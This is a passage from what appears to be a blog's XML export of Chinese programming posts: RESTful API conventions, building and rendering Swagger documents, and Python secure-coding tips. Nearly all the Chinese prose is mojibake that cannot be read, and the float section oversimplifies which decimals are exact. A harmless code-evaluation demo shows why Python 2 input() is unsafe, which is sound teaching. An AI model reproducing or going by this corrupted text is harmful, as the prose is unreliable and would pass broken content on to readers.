[POST/PUT/PATCH]ï¼šç”¨æˆ·æ–°å»ºæˆ–ä¿®æ”¹æ•°æ®æˆåŠŸã€‚202 Accepted - [*]ï¼šè¡¨ç¤ºä¸€ä¸ªè¯·æ±‚å·²ç»è¿›å…¥åŽå°æŽ’é˜Ÿï¼ˆå¼‚æ­¥ä»»åŠ¡ï¼‰204 NO CONTENT - [DELETE]ï¼šç”¨æˆ·åˆ é™¤æ•°æ®æˆåŠŸã€‚400 INVALID REQUEST - [POST/PUT/PATCH]ï¼šç”¨æˆ·å‘å‡ºçš„è¯·æ±‚æœ‰é”™è¯¯ï¼ŒæœåŠ¡å™¨æ²¡æœ‰è¿›è¡Œæ–°å»ºæˆ–ä¿®æ”¹æ•°æ®çš„æ“ä½œï¼Œè¯¥æ“ä½œæ˜¯å¹‚ç­‰çš„ã€‚401 Unauthorized - [*]ï¼šè¡¨ç¤ºç”¨æˆ·æ²¡æœ‰æƒé™ï¼ˆä»¤ç‰Œã€ç”¨æˆ·åã€å¯†ç é”™è¯¯ï¼‰ã€‚403 Forbidden - [*] è¡¨ç¤ºç”¨æˆ·å¾—åˆ°æŽˆæƒï¼ˆä¸Ž401é”™è¯¯ç›¸å¯¹ï¼‰ï¼Œä½†æ˜¯è®¿é—®æ˜¯è¢«ç¦æ­¢çš„ã€‚404 NOT FOUND - [*]ï¼šç”¨æˆ·å‘å‡ºçš„è¯·æ±‚é’ˆå¯¹çš„æ˜¯ä¸å­˜åœ¨çš„è®°å½•ï¼ŒæœåŠ¡å™¨æ²¡æœ‰è¿›è¡Œæ“ä½œï¼Œè¯¥æ“ä½œæ˜¯å¹‚ç­‰çš„ã€‚406 Not Acceptable - [GET]ï¼šç”¨æˆ·è¯·æ±‚çš„æ ¼å¼ä¸å¯å¾—ï¼ˆæ¯”å¦‚ç”¨æˆ·è¯·æ±‚JSONæ ¼å¼ï¼Œä½†æ˜¯åªæœ‰XMLæ ¼å¼ï¼‰ã€‚410 Gone -[GET]ï¼šç”¨æˆ·è¯·æ±‚çš„èµ„æºè¢«æ°¸ä¹…åˆ é™¤ï¼Œä¸”ä¸ä¼šå†å¾—åˆ°çš„ã€‚422 Unprocesable entity - [POST/PUT/PATCH] å½“åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå‘ç”Ÿä¸€ä¸ªéªŒè¯é”™è¯¯ã€‚500 INTERNAL SERVER ERROR - [*]ï¼šæœåŠ¡å™¨å‘ç”Ÿé”™è¯¯ï¼Œç”¨æˆ·å°†æ— æ³•åˆ¤æ–­å‘å‡ºçš„è¯·æ±‚æ˜¯å¦æˆåŠŸã€‚ é”™è¯¯å¤„ç†å¦‚æžœçŠ¶æ€ç æ˜¯4xxï¼Œå°±åº”è¯¥å‘ç”¨æˆ·è¿”å›žå‡ºé”™ä¿¡æ¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿”å›žçš„ä¿¡æ¯ä¸­å°†errorä½œä¸ºé”®åï¼Œå‡ºé”™ä¿¡æ¯ä½œä¸ºé”®å€¼å³å¯ã€‚ 123&#123; error: "Invalid API key"&#125; è¿”å›žç»“æžœ é’ˆå¯¹ä¸åŒæ“ä½œï¼ŒæœåŠ¡å™¨å‘ç”¨æˆ·è¿”å›žçš„ç»“æžœåº”è¯¥ç¬¦åˆä»¥ä¸‹è§„èŒƒã€‚ 123456GET /collection: è¿”å›žä¸€ç³»åˆ—èµ„æºå¯¹è±¡GET /collection/resource: è¿”å›žå•ç‹¬çš„èµ„æºå¯¹è±¡POST /collection: è¿”å›žæ–°åˆ›å»ºçš„èµ„æºå¯¹è±¡PUT /collection/resource: è¿”å›žå®Œæ•´çš„èµ„æºå¯¹è±¡PATCH /collection/resource: è¿”å›žå®Œæ•´çš„èµ„æºå¯¹è±¡DELETE /collection/resource: è¿”å›žä¸€ä¸ªç©ºæ–‡æ¡£ Hypermedia API RESTful APIæœ€å¥½åšåˆ°Hypermediaï¼Œå³è¿”å›žç»“æžœä¸­æä¾›é“¾æŽ¥ï¼Œè¿žå‘å…¶ä»–APIæ–¹æ³•ï¼Œä½¿å¾—ç”¨æˆ·ä¸æŸ¥æ–‡æ¡£ï¼Œä¹ŸçŸ¥é“ä¸‹ä¸€æ­¥åº”è¯¥åšä»€ä¹ˆ Hypermedia APIçš„è®¾è®¡è¢«ç§°ä¸ºHATEOAS link: ç”¨æˆ·è¯»å–è¿™ä¸ªå±žæ€§å°±çŸ¥é“ä¸‹ä¸€æ­¥è¯¥è°ƒç”¨ä»€ä¹ˆAPIäº† rel: relè¡¨ç¤ºè¿™ä¸ªAPIä¸Žå½“å‰ç½‘å€çš„å…³ç³»ï¼ˆcollectionå…³ç³»ï¼Œå¹¶ç»™å‡ºè¯¥collectionçš„ç½‘å€ï¼‰ href: APIçš„ç»å¯¹è·¯å¾„ title: APIçš„æ ‡é¢˜,ç”¨äºŽæ¦‚è¿°ç”¨é€” type: API å“åº”çš„æ•°æ®ç±»åž‹ 123456&#123;&quot;link&quot;: &#123; &quot;rel&quot;: &quot;collection https://www.example.com/zoos&quot;, &quot;href&quot;: &quot;https://api.example.com/zoos&quot;, &quot;title&quot;: &quot;List of zoos&quot;, &quot;type&quot;: &quot;application/vnd.yourformat+json&quot;&#125;&#125; 12345 maojun@maojun-mbp#curl https://api.github.com/user&#123; &quot;message&quot;: &quot;Requires authentication&quot;, &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;&#125; è®¤è¯ è®¤è¯å’ŒæŽˆæƒçš„ç”¨æˆ·æ¨¡åž‹è¯¥å°½é‡é‡‡ç”¨RBACæ¨¡åž‹ï¼Œå› ä¸ºå…¶è‰¯å¥½çš„æ‰©å®¹æ€§ã€‚ APIè®¤è¯çš„æ‰‹æ®µæœ€å¥½é‡‡ç”¨OAuth2.0, ç®€å•çš„å¯ä»¥é‡‡ç”¨ JWTï¼ˆJson Web Tokenï¼‰ å…³äºŽOAuthçš„ç®€ä»‹å¯ä»¥å‚è€ƒé˜®ä¸€å³°OAuth2.0ç®€ä»‹ å…³äºŽJWTå‚è€ƒæ­¤æ–‡JWTä½¿ç”¨ å†…å®¹ç±»åž‹ XMLå·²æ˜¯è¿‡åŽ»æ—¶äº†ï¼ŒçŽ°ä»£çš„webç»Ÿä¸€ä½¿ç”¨JSONï¼Œä¹Ÿå°±æ˜¯HTTPå¤´ç§çš„Content Typeæ ‡ç­¾é‡‡ç”¨ application/json 1234567891011121314151617181920212223242526è¯·æ±‚æŠ¥æ–‡POST /v1/animal HTTP/1.1Host: api.example.orgAccept: application/jsonContent-Type: application/jsonContent-Length: 24 &#123; &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;å“åº”æŠ¥æ–‡HTTP/1.1 200 OKDate: Wed, 18 Dec 2013 06:08:22 GMTContent-Type: application/jsonAccess-Control-Max-Age: 1728000Cache-Control: no-cache &#123; &quot;id&quot;: 12, &quot;created&quot;: 1386363036, &quot;modified&quot;: 1386363036, &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;]]></content>
      <categories>
        <category>ç¨‹åºè®¾è®¡</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•ä½¿ç”¨swaggerè®¾è®¡å‡ºæ¼‚äº®çš„RESTful API]]></title>
    <url>%2F2017%2F01%2F05%2Fapi-design-swagger%2F</url>
    <content type="text"><![CDATA[æŒ‰ç…§çŽ°åœ¨çš„è¶‹åŠ¿ï¼Œå‰åŽç«¯åˆ†ç¦»å‡ ä¹Žå·²ç»æ˜¯ä¸šç•Œå¯¹å¼€å‘å’Œéƒ¨ç½²æ–¹å¼æ‰€è¾¾æˆçš„ä¸€ç§å…±è¯†, åŽå°åªè´Ÿè´£æ•°æ®çš„æä¾›å’Œè®¡ç®—ï¼Œè€Œå®Œå…¨ä¸å¤„ç†å±•çŽ°ã€‚è€Œå‰ç«¯åˆ™è´Ÿè´£æ‹¿åˆ°æ•°æ®ï¼Œç»„ç»‡æ•°æ®å¹¶å±•çŽ°çš„å·¥ä½œã€‚è¿™æ ·ç»“æž„æ¸…æ™°ï¼Œå…³æ³¨ç‚¹åˆ†ç¦»ï¼Œå‰åŽç«¯ä¼šå˜å¾—ç›¸å¯¹ç‹¬ç«‹å¹¶æ¾è€¦åˆã€‚è€Œå‰æ®µå’ŒåŽç«¯å¯¹å¾…çš„å¥‘çº¦å°±æ˜¯APIè®¾è®¡æ–‡æ¡£, æœ‰äº†APIçš„è®¾è®¡æ–‡æ¡£è¿‡åŽ, åŽç«¯ä¾æ®è®¾è®¡æ–‡ä»¶å¼€å‘åŽç«¯ç¨‹åº, å‰æ®µæ ¹æ®APIè®¾è®¡æ–‡æ¡£æ¨¡æ‹ŸæœåŠ¡å™¨,å¼€å‘å‰æ®µé¡µé¢ã€‚è€ŒSwaggerå°±æ˜¯å…¶ä¸­ä¸€ç§æ¯”è¾ƒä¼˜ç§€çš„ RESTful APIè®¾è®¡å·¥å…·ã€‚ swagger å·¥å…·ç®€ä»‹swaggeræ˜¯ä¸€ä¸ªRESTful API çš„è®¾è®¡å·¥å…·ï¼Œå®˜æ–¹æä¾›3ç§å·¥å…·ï¼š swagger-editor åœ¨çº¿ç¼–è¾‘å™¨ï¼ŒåŒæ—¶æä¾›ç¼–è¾‘-å±•çŽ°-å®¢æˆ·ç«¯-æœåŠ¡ç«¯ä»£ç çš„ç”Ÿæˆ swagger-ui å±•ç¤ºå·¥å…·ï¼Œå°†ç¼–è¾‘å™¨å®šä¹‰å¥½çš„jsonæè¿°æ–‡ä»¶å‹å¥½å±•ç¤ºçš„å·¥å…·ã€‚ swagger-codegen ç”ŸæˆæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„ä»£ç ã€‚ å› ä¸ºswagger-editoré›†æˆäº†swagger-codegenåŠŸèƒ½ï¼Œå› æ­¤æˆ‘ä»¬ä»…éœ€è¦ä½¿ç”¨swagger-editorå’Œswagger-uiå°±å¤Ÿäº†ã€‚ ç¼–è¾‘å™¨(editor)å¯ä»¥ä½¿ç”¨åœ¨çº¿ç¼–è¾‘å™¨ï¼Œè€Œç”±äºŽç½‘ç»œåŽŸå› , å¾€å¾€ä¸èƒ½å¾ˆå¥½çš„ä½¿ç”¨swaggeræä¾›çš„åœ¨çº¿ç¼–è¾‘å™¨ï¼Œç„¶è€Œè¿™ä¸ªåœ¨çº¿ç¼–è¾‘å™¨ä¹Ÿå¯ä»¥æœ¬åœ°éƒ¨ç½²ï¼Œå…¶æ¬¡æœ‰å¾ˆå¤šç¼–è¾‘å™¨ä¹Ÿæœ‰swaggerçš„æ’ä»¶, é€šè¿‡æŒ‰ç…§swaggeræ’ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é…ç½®å‡ºä¸€ä¸ªswaggerçš„ç¼–è¾‘å™¨ã€‚æœ‰äº†ç¼–è¾‘å™¨åŽï¼Œæˆ‘ä»¬éœ€è¦ç†Ÿæ‚‰ä½¿ç”¨swaggeræ¥è®¾è®¡APIçš„ä¸€äº›è¯­æ³•ã€‚ éƒ¨ç½²æœ¬åœ°ç¼–è¾‘å™¨å®‰è£…dockerï¼Œé…ç½®é•œåƒåŠ é€Ÿï¼Œç„¶åŽæ‹‰åŽ»é•œåƒåˆ°æœ¬åœ°è¿è¡Œ12docker pull swaggerapi/swagger-editordocker run -p 80:8080 swaggerapi/swagger-editor ä½¿ç”¨æœ¬åœ°ç¼–è¾‘å™¨æŽ¨èä½¿ç”¨vscodeä½œä¸ºç¼–è¾‘å™¨, å®‰è£…vscodeçš„Swagger Viewæ’ä»¶ å°±å¯ä»¥æ‰“é€ ä¸€ä¸ª swaggerçš„ç¼–è¾‘å™¨äº†é‡‡ç”¨yamlç¼–å†™ï¼Œç„¶åŽä½¿ç”¨Swagger Preview æŸ¥çœ‹é¢„è§ˆã€‚ swagger2.0è¯­æ³•è¯¦æƒ…å‚è€ƒswagger2.0å®˜æ–¹è§„èŒƒ æ ¼å¼é‡‡ç”¨jsonï¼Œ å› ä¸ºyamlæ˜¯jsonçš„ä¸€ä¸ªè¶…é›†ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚é€šå¸¸æƒ…å†µæˆ‘ä»¬é€šè¿‡yamlæ¥å®Œæˆç¼–è¾‘ï¼Œæœ€åŽé€šè¿‡ç¼–è¾‘å™¨å¯¼å‡ºä¸ºjsonæ–‡ä»¶ã€‚ æ–‡ä»¶ç»“æž„ä¸ºä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ï¼Œä½†æ˜¯å…¶ä¸­definitionséƒ¨åˆ†å¯ä»¥è¢«æŠ½å‡ºæ¥ä¸ºä¸€ä¸ªç‹¬ç«‹æ–‡ä»¶ï¼Œé€šè¿‡$refè¿›è¡Œå¼•ç”¨ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ï¼Œè¿™ä¸ªæ–‡ä»¶åº”è¯¥è¢«å‘½åä¸º swagger.json æ•°æ®ç±»åž‹ç”¨äºŽæè¿°ä¸€ä¸ªæ•°æ®çš„æ•°æ®ç±»åž‹ï¼Œå¯¹è±¡å®šä¹‰æ—¶ä½¿ç”¨ã€‚ Common Name type format Comments integer integer int32 signed 32 bits long integer int64 signed 64 bits float number float double number double string string byte string byte base64 encoded characters binary string binary any sequence of octets boolean boolean date string date As defined by full-date - RFC3339 dateTime string date-time As defined by date-time - RFC3339 password string password Used to hint UIs the input needs to be obscured. è§„èŒƒè§„èŒƒä¹Ÿå°±æ˜¯è¯­æ³•ï¼Œä¼šå®‰è£…æ­¤è§„èŒƒæ¥ç¼–å†™APIè®¾è®¡æ–‡æ¡£ã€‚ä»¥ä¸‹åˆ—å‡ºäº†æ‰€æœ‰éœ€è¦çš„å…³é”®å­—æ®µ å­—æ®µå ç±»åž‹ æè¿° swagger string å¿…å¡«é¡¹ã€‚è¡¨ç¤ºä½¿ç”¨çš„swaggerçš„ç‰ˆæœ¬ï¼Œå¿…é¡»ä¸º2.0 info Info Object å¿…å¡«é¡¹ã€‚æä¾›APIçš„ä¸€äº›å…ƒæ•°æ®æè¿° host string æä¾›è¯¥APIæœåŠ¡çš„ä¸»æœºåç§°æˆ–è€…IPï¼Œæµ‹è¯•æ—¶ ä½¿ç”¨è¯¥åœ°å€è¿›ç¨‹æµ‹è¯•ã€‚ basePath string APIçš„åŸºæœ¬è·¯å¾„,è¿™æ˜¯ç›¸å¯¹çš„hostã€‚ å¦‚æžœä¸åŒ…æ‹¬,APIæ˜¯ç›´å±žhostã€‚ å¿…é¡»ä»¥â€/â€œå¼€å¤´ schemes [string] APIçš„ä¼ è¾“åè®®çš„åˆ—è¡¨ã€‚ åœ¨â€httpâ€,â€httpsâ€,â€wsâ€,â€wssâ€å…¶ä¸­é€‰æ‹© consumes [string] ä¸€ä¸ªMIMEç±»åž‹çš„apiå¯ä»¥ä½¿ç”¨åˆ—è¡¨ã€‚ å€¼å¿…é¡»æ˜¯æ‰€æè¿°çš„Mimeç±»åž‹ produces [string] MIMEç±»åž‹çš„apiå¯ä»¥äº§ç”Ÿçš„åˆ—è¡¨ã€‚ å€¼å¿…é¡»æ˜¯æ‰€æè¿°çš„Mimeç±»åž‹ paths è·¯å¾„å¯¹è±¡ å¿…å¡«é¡¹ã€‚å¯ç”¨çš„è·¯å¾„å’Œæ“ä½œçš„API definitions å®šä¹‰å¯¹è±¡ ä¸€ä¸ªå¯¹è±¡æ•°æ®ç±»åž‹å®šä¹‰ parameters å‚æ•°å®šä¹‰å¯¹è±¡ å®šä¹‰è¯·æ±‚å‚æ•°çš„å¯¹è±¡ responses ååº”å®šä¹‰å¯¹è±¡ å®šä¹‰è¯·æ±‚å“åº”å¯¹è±¡ securityDefinitions å®‰å…¨å®šä¹‰å¯¹è±¡ å®‰å…¨æ–¹æ¡ˆå®šä¹‰è§„èŒƒ,æ¯”å¦‚è®¤è¯ security å®‰å…¨éœ€æ±‚å¯¹è±¡ è¿™é‡Œä¸»è¦æŒ‡ä½¿ç”¨å“ªç§è®¤è¯æ‰‹æ®µ tags æ ‡ç­¾å¯¹è±¡ æ²¡ä¸ªRESTfulä¸­èµ„æºçš„æ ‡ç­¾ï¼Œåˆ—è¡¨ä¸­çš„æ¯ä¸ªæ ‡è®°åç§°å¿…é¡»æ˜¯å”¯ä¸€çš„ externalDocs å¤–éƒ¨æ–‡æ¡£å¯¹è±¡ é¢å¤–çš„å¤–éƒ¨æ–‡æ¡£, æŒ‡å‘å¤–éƒ¨url æ¸²æŸ“å™¨(ui)swagger-uiçš„ä½¿ç”¨å¾ˆç®€å•swager-uiå®˜æ–¹æ–‡æ¡£ HTMLæ–‡æ¡£æ¸²æŸ“æ¸²æŸ“å™¨ä½¿ç”¨å®˜æ–¹çš„swagger-uiï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œç”¨æ¥æ¸²æŸ“æˆ‘ä»¬åˆšæ‰ç¼–è¾‘å®Œæˆçš„api è®¾è®¡æ–‡æ¡£ã€‚è¿™é‡Œä¸€èˆ¬ä½¿ç”¨node çš„ expressä¸ºwebæ¡†æž¶æ¥åšè¿™ä¸ªç®€å•çš„webæœåŠ¡å™¨ PDFæ–‡æ¡£æ¸²æŸ“å°†APIè®¾è®¡æ–‡æ¡£æ¸²æŸ“æˆPDF, æµç¨‹æ˜¯è¿™æ ·: swagger.yaml â€”&gt; asciiDocâ€”&gt; pdf ä½¿ç”¨swagger2markupæ¥ç”ŸæˆasciiDocæ ¼å¼çš„æ–‡æ¡£ä¸‹è½½swagger2markupå·¥å…·,ä¸‹è½½åœ°å€,é€‰æ‹©ä½ æƒ³è¦çš„ç‰ˆæœ¬ä¸‹è½½ä½¿ç”¨å·¥å…·ç”ŸæˆasciiDoc, -iæŒ‡å®šswagger.yamlçš„ä½ç½®, -fæŒ‡å®šè¾“å‡ºæ–‡ä»¶åç§°ï¼š 1java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml -f asiidoc/swagger ä½¿ç”¨asciidoctoræ¥å°†asciiDocæ¢æ¢æˆPDFè¿™æ˜¯ä¸€ä¸ªrubyå†™çš„å·¥å…·ï¼Œæˆ‘æœ¬åœ°ä¸æ‰“ç®—éƒ¨ç½²rubyçŽ¯å¢ƒï¼Œå› æ­¤åœ¨æ‰¾ä¸€ä¸ªdockeré•œåƒï¼šmadduci/docker-asciidoctor-pdfç”±äºŽè®¿é—®dockerhubçš„é•œåƒé€Ÿåº¦éžå¸¸æ…¢ï¼Œå› æ­¤æˆ‘å°†è¯¥å·¥å…·çš„ä½¿ç”¨è¯´æ˜Žå¤åˆ¶äº†ä¸‹æ¥ï¼Œé•œåƒä½¿ç”¨è¯´æ˜Ž Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the fileTo build your own documents as PDF, simply run the container as:docker run â€“rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adocIf you want to use some custom styles, just run it asdocker run â€“rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adocand it will generate the pdf in the mounted volume /document è¿™å·¥å…·åœ¨ç”Ÿæˆå«æœ‰ä¸­æ–‡çš„pdfæ–‡æ¡£æ—¶æœ‰å­—ä½“é—®é¢˜ï¼Œå› æ­¤æˆ‘ä¿®æ”¹äº†å­—ä½“ä¸ºå¾®è½¯é›…é»‘å­—ä½“ï¼Œä»¥ä¸‹æ˜¯ä¿®æ”¹æ–¹æ³•ï¼š æ·»åŠ é›…é»‘å­—ä½“åˆ°å½“å‰çš„Fontsæ–‡ä»¶å¤¹ä¸‹é¢,è¿™é‡Œéœ€è¦æ ‡å‡†å­—ä½“å’Œç²—ä½“, è€Œé»˜è®¤æä¾›çš„å­—ä½“åªæœ‰è¿™äº›é»˜è®¤æä¾›çš„å­—ä½“ 1234âžœ asiidoc ls Fonts |grep -i &apos;yahei&apos;Microsoft Yahei.ttfyahei.ttfyahei_bold.ttf ä¿®æ”¹ä¸»é¢˜é…ç½®default-theme.ymlçš„Noto Serifå­—æ®µï¼Œä½¿ç”¨è¯¥å­—ä½“:é…ç½®æ–‡ä»¶ä¸‹è½½åœ°å€é»˜è®¤é…ç½®æ–‡ä»¶ä¸‹è½½åœ°å€ 12345Noto Serif:normal: yahei.ttfbold: yahei_bold.ttfitalic: yahei.ttfbold_italic: yahei_bold.tt æœ€åŽæŠŠæˆ‘ä»¬ç”Ÿæˆå¥½çš„swagger.adoc, ä¸»é¢˜é…ç½®æ–‡ä»¶,å­—ä½“ æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼ŒæŒ‚è½½åˆ°dockeré‡Œé¢åŽ»: 123âžœ Downloads ls asiidocFonts swagger.adoc themesdocker run --rm -v $(pwd)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf -a pdf-fontsdir=/document/Fonts -a pdf-stylesdir=/document/themes /document/swagger.adoc æœ€åŽæŸ¥çœ‹asiidocä¸‹é¢å°±ä¼šæœ‰ç”Ÿæˆçš„pdfæ–‡ä»¶ ä»£ç ç”Ÿæˆå™¨(codegen)swaggerèƒ½æä¾›æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„ä»£ç ç”ŸæˆåŠŸèƒ½,è¿™ä¸ªåŠŸèƒ½åœ¨swagger-editorä¸Šå·²ç»é›†æˆç”Ÿæˆserverç«¯ä»£ç ï¼šç”Ÿæˆå®¢æˆ·ç«¯ä»£ç ï¼š]]></content>
      <categories>
        <category>ç¨‹åºè®¾è®¡</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>swagger</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Pythonä¸­çš„ä¸€äº›å®‰å…¨å»ºè®®]]></title>
    <url>%2F2017%2F01%2F02%2Fpython-bestpractice%2F</url>
    <content type="text"><![CDATA[ç”±äºŽPythonç®€æ´ï¼Œä¼˜é›…ï¼Œå¼€å‘æ•ˆçŽ‡é«˜ï¼Œæ¸æ¸åœ¨è®¡ç®—çŽ¯å¢ƒä¸­æ— å¤„ä¸åœ¨ã€‚ä½†æ˜¯å¦‚æžœä½ ä¸æ³¨æ„ï¼Œå®¹æ˜“ç¼–å†™å‡ºå…·æœ‰ä¸¥é‡å®‰å…¨éšæ‚£çš„ä»£ç , ä»¥ä¸‹æˆ‘æ•´ç†çš„ä¸€äº›å¦‚ä½•ç¼–å†™å‡ºå®‰å…¨ä»£ç çš„ä¸€äº›å»ºè®®ã€‚ inputå‡½æ•°åœ¨Python 2å¤§é‡çš„å†…ç½®åŠŸèƒ½é›†åˆä¸­ï¼Œinputå®Œå…¨å°±æ˜¯ä¸€ä¸ªå®‰å…¨ç¾éš¾ã€‚ä¸€æ—¦è°ƒç”¨å®ƒï¼Œä»Žæ ‡å‡†è¾“å…¥è¯»å…¥çš„ä»»ä½•ä¸œè¥¿éƒ½ä¼šè¢«ç«‹å³è§£æžä¸ºPythonä»£ç ï¼š12345678910âžœ ~ python2Python 2.7.12 (default, Dec 2 2016, 21:51:52)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; input()dir()['__builtins__', '__doc__', '__name__', '__package__']&gt;&gt;&gt; input()__import__('sys').exit()âžœ ~ æ˜¾ç„¶ï¼Œå¿…é¡»æ°¸è¿œä¸ä½¿ç”¨inputå‡½æ•°ï¼Œé™¤éžè„šæœ¬çš„æ ‡å‡†è¾“å…¥ä¸­çš„æ•°æ®æ˜¯å®Œå…¨å¯ä¿¡çš„ã€‚ Python 2æ–‡æ¡£å»ºè®®å°†raw_inputä½œä¸ºä¸€ä¸ªå®‰å…¨çš„æ›¿ä»£å“ã€‚åœ¨Python 3ä¸­ï¼Œinputå‡½æ•°ç­‰åŒäºŽraw_inputï¼Œä»Žè€Œä¸€åŠ³æ°¸é€¸åœ°è§£å†³äº†è¿™ä¸ªéšæ‚£ assertè¯­å¥åœ¨ Python åº”ç”¨ä¸­ä½¿ç”¨ assert è¯­å¥åœ¨ä¸å¯èƒ½æ¡ä»¶ä¸‹æ•èŽ·æ˜¯ä¸€ä¸ªç¼–ç¨‹ä¹ æƒ¯ã€‚123def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... ç„¶è€Œï¼Œåœ¨å°†æºä»£ç ç¼–è¯‘æˆä¼˜åŒ–çš„å­—èŠ‚ç æ—¶ï¼ˆä¾‹å¦‚ï¼Œ python - O ï¼‰ï¼ŒPython å¹¶ä¸ä¸º assert è¯­å¥ç”Ÿæˆä»»ä½•æŒ‡ä»¤ã€‚å®ƒé»˜é»˜åœ°åˆ é™¤é‚£äº›ç¨‹åºå‘˜å†™çš„è®©ç¨‹åºå…å—ç•¸å½¢æ•°æ®æ”»å‡»çš„ä»£ç ï¼Œè®©åº”ç”¨æš´éœ²åœ¨æ”»å‡»ä¹‹ä¸­ã€‚è¯¥æ¼æ´žçš„æ ¹æœ¬åŽŸå› åœ¨äºŽ assertæœºåˆ¶çº¯ç²¹æ˜¯ä¸ºæµ‹è¯•ç›®çš„è€Œè®¾ï¼Œæ­£å¦‚åœ¨ C++ ä¸­åšçš„é‚£æ ·ã€‚ç¨‹åºå‘˜å¿…é¡»ä½¿ç”¨å…¶ä»–æ‰‹æ®µä»¥ä¿è¯æ•°æ®ä¸€è‡´æ€§ã€‚ ä¸è¦ä½¿ç”¨isæ¥æ¯”è¾ƒintåœ¨æˆ‘ä»¬çš„å°è±¡é‡Œï¼Œintæ˜¯ä¸å¯å˜å¯¹è±¡ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­12345678910&gt;&gt;&gt; a = 257&gt;&gt;&gt; b = 257&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = 256&gt;&gt;&gt; b = 256&gt;&gt;&gt; a is bTrue ä¸ºäº†é¿å…æ¯æ¬¡ç»™ç»å¸¸ä½¿ç”¨åˆ°è¿™éƒ¨åˆ†æ•´æ•°åˆ†é…ä¸€ä¸ªæ–°çš„å†…å­˜ï¼ŒPythoné¢„å…ˆç”Ÿæˆå¹¶ç¼“å­˜å¥½è¿™äº›å¸¸ç”¨æ•´æ•°([-5, 257))ï¼Œè¿™æ ·çš„é¢„å¤„ç†å¯ä»¥åŠ å¿«ç¨‹åºè¿è¡Œæ—¶æ•ˆçŽ‡ï¼Œæ›´è¯¦ç»†çš„äº†è§£ä¼šåœ¨ä»¥åŽçš„Pythonæ•°æ®ç»“æž„æºç è§£è¯»éƒ¨åˆ†åšä»‹ç»ã€‚å› æ­¤ä¸è¦ä½¿ç”¨isæ¯”è¾ƒæ•´æ•°å¤§å°ï¼Œisæ˜¯ç”¨äºŽæ¯”è¾ƒæ˜¯å¦ä¸ºåŒä¸€å¯¹è±¡çš„ï¼Œisæœ¬èº«æ˜¯ä¸æ˜¯ç”¨æ¥å¹²è¿™ä»¶äº‹çš„ã€‚ floatçš„èˆå…¥é—®é¢˜å› ä¸ºåè¿›åˆ¶çš„å°æ•°å¹¶ä¸èƒ½ç”¨äºŒè¿›åˆ¶ç²¾ç¡®çš„è¡¨è¾¾å‡ºæ¥, åœ¨åè¿›åˆ¶ä¸­ï¼Œè¿›åˆ¶çš„åŸºæ•°æ˜¯10ï¼Œè€Œ5æ­£å¥½æ˜¯10çš„ä¸€åŠã€‚ 2çš„ä¸€åŠæ˜¯å¤šå°‘ï¼Ÿå½“ç„¶æ˜¯1äº†ã€‚ æ‰€ä»¥ï¼Œåè¿›åˆ¶çš„0.5å°±æ˜¯äºŒè¿›åˆ¶çš„0.1, è€Œå¯¹äºŽäºŒè¿›åˆ¶æ¥è¯´ï¼Œåªæœ‰0å’Œ1çš„å˜åŒ–ï¼Œé‚£ä¹ˆåªæœ‰0.1å’Œ0.0,è¿™æ ·ä»…èƒ½ç²¾ç¡®è¡¨è¾¾åè¿›åˆ¶0.0å’Œ0.5,ä½ ä»¥æ­¤ç±»æŽ¨ï¼Œé‚£ä¹ˆä¼šå‘çŽ°ä¸€ä¸ªç»“è®ºï¼šå¦‚æžœä¸€ä¸ªåè¿›åˆ¶æ•°å¯ä»¥ç”¨äºŒè¿›åˆ¶ç²¾ç¡®è¡¨ç¤ºï¼Œé‚£ä¹ˆå®ƒçš„æœ€åŽä¸€ä½è‚¯å®šæ˜¯5,æ‰€ä»¥åªæœ‰ä»¥5ç»“å°¾çš„å°æ•°æ‰èƒ½è¢«ç²¾ç¡®çš„è®¡ç®—æˆ‘ä»¬çœ‹çœ‹ä¸‹é¢ä¸€ä¸ªæœ‰è¶£çš„çŽ°è±¡ã€‚1234567891011121314151617181920212223242526In [1]: 0.1 + 0.1Out[1]: 0.2In [2]: 0.1 + 0.1 + 0.1Out[2]: 0.30000000000000004In [3]: 0.1 + 0.1 + 0.1 + 0.1Out[3]: 0.4In [4]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[4]: 0.5In [5]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[5]: 0.6In [6]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[6]: 0.7In [7]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[7]: 0.7999999999999999In [8]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 